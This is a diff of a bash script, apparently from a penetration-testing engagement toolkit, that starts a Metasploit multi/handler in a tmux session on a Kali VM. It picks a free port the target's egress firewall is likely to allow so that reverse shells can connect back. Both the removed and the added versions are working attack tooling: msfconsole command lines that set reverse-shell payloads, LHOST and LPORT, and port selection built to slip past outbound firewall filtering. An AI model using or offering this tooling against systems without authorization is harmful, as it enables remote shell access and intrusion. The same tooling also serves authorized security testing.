@@ -1,48 +1,41 @@
 #!/usr/bin/env bash
-# Launch an msf multi/handler on the first FREE egress-friendly port in the engagement's tmux
-# 'msf' window on the Kali VM. Fixes two failure modes at once:
-#   - "address already in use" bind failure (a port in the egress set is already listening), and
-#   - the silent no-callback from a random high port the target's egress firewall filters.
-# A reverse-shell LPORT is NOT a free choice: it must exit through the target firewall, so we never
-# pick a random port -- we pick the first port from the egress-allowed pool that is free on the VM.
-# The chosen LPORT is printed (last line) so the caller builds the matching target payload with it.
+# Launch a Metasploit multi-handler on the VM on the first FREE egress-friendly port.
 #
-# Usage: bash vm-handler.sh <eng> <lhost> [payload]      (payload default: cmd/unix/reverse_bash)
-#        bash vm-handler.sh --selftest
-# Env:   EGRESS_PORTS (default "80 443 53 8000 8080"), VM_SH (default /root/vm.sh)
+# Why: reverse shells must ride ports the TARGET's egress allows (ufw OUT often narrows to
+# 80/443/etc), and the obvious port is frequently already taken by the attacker's own staging
+# listener. This picks the LPORT so the handler never fails to bind on a taken port nor
+# silently binds a filtered high port, then starts msfconsole in a tmux session named
+# `msf` ON THE VM and prints the LPORT to build the payload with.
+#
+# Usage: bash scripts/vm-handler.sh <lhost> [tmux-session] [payload]
+#   bash scripts/vm-handler.sh 192.168.128.212
+#   bash scripts/vm-handler.sh 192.168.128.212 msf linux/x64/shell_reverse_tcp
+# VM_SH overridable (default /root/vm.sh, same convention as vm-rsh.sh: invoked via `bash`).
 set -uo pipefail
+VM_SH="${VM_SH:-/root/vm.sh}"
+LHOST="${1:?usage: vm-handler.sh <lhost> [tmux-session] [payload]}"
+SESS="${2:-msf}"
+PAYLOAD="${3:-generic/shell_reverse_tcp}"
+PORTS="443 80 53 8000 8080"
 
-EGRESS_PORTS="${EGRESS_PORTS:-80 443 53 8000 8080}"
+vm() { bash "$VM_SH" "$1"; }
 
-# pick_free_port <bound-ports>: first EGRESS_PORTS entry not in the (space-delimited) bound list.
-pick_free_port() {
-  local bound=" ${1:-} "
-  local p
-  for p in $EGRESS_PORTS; do
-    case "$bound" in *" $p "*) continue;; esac
-    printf '%s\n' "$p"; return 0
-  done
-  return 1
-}
-
-if [ "${1:-}" = "--selftest" ]; then
-  [ "$(pick_free_port '443')" = "80" ] || { echo "FAIL: 443 bound -> want 80"; exit 1; }
-  [ "$(EGRESS_PORTS='80 443 53' pick_free_port '80 443')" = "53" ] || { echo "FAIL: want 53"; exit 1; }
-  if pick_free_port '80 443 53 8000 8080' >/dev/null; then echo "FAIL: all bound should error"; exit 1; fi
-  echo "selftest ok"; exit 0
+LISTEN="$(vm "ss -ltn")" || { echo "vm-handler: cannot reach VM via ${VM_SH}" >&2; exit 1; }
+FREE=""
+for p in $PORTS; do
+  if ! grep -q ":${p} " <<<"$LISTEN"; then FREE="$p"; break; fi
+done
+if [ -z "$FREE" ]; then
+  echo "vm-handler: all egress-friendly ports busy (${PORTS}) - free one and re-run" >&2
+  exit 1
 fi
 
-ENG="${1:?need <eng>}"; LHOST="${2:?need <lhost>}"; PAYLOAD="${3:-cmd/unix/reverse_bash}"
-VM_SH="${VM_SH:-/root/vm.sh}"
-VAULT="$(cd "$(dirname "$0")/.." && pwd)"
-
-# ports already listening on the VM (any interface) -> the bound set
-BOUND="$(bash "$VM_SH" "ss -tlnH 2>/dev/null | awk '{print \$4}' | sed 's/.*://' | sort -un | tr '\n' ' '")"
-LPORT="$(pick_free_port "$BOUND")" || {
-  echo "no free egress port in [$EGRESS_PORTS] (bound on VM: $BOUND)" >&2; exit 1; }
-
-echo "handler: LPORT=$LPORT payload=$PAYLOAD LHOST=$LHOST (egress-friendly, free on VM)" >&2
-bash "$VAULT/scripts/vm-scan.sh" --win msf "$ENG" "$LHOST" \
-  "msfconsole -q -x \"use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j\"" >&2
-
-printf '%s\n' "$LPORT"
+vm "tmux has-session -t ${SESS} 2>/dev/null || tmux new-session -d -s ${SESS} bash" \
+  || { echo "vm-handler: could not create tmux session '${SESS}' on the VM" >&2; exit 1; }
+vm "tmux has-session -t ${SESS} 2>/dev/null" \
+  || { echo "vm-handler: session '${SESS}' did not persist" >&2; exit 1; }
+vm "tmux send-keys -t ${SESS}:0 \"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ${PAYLOAD}; set LHOST ${LHOST}; set LPORT ${FREE}; set ExitOnSession false; run -j'\" Enter" \
+  || { echo "vm-handler: send-keys to '${SESS}' failed" >&2; exit 1; }
+echo "LPORT=${FREE}"
+echo "LHOST=${LHOST}"
+echo "handler: tmux session '${SESS}' on the VM (attach: bash ${VM_SH} 'tmux attach -t ${SESS}')"
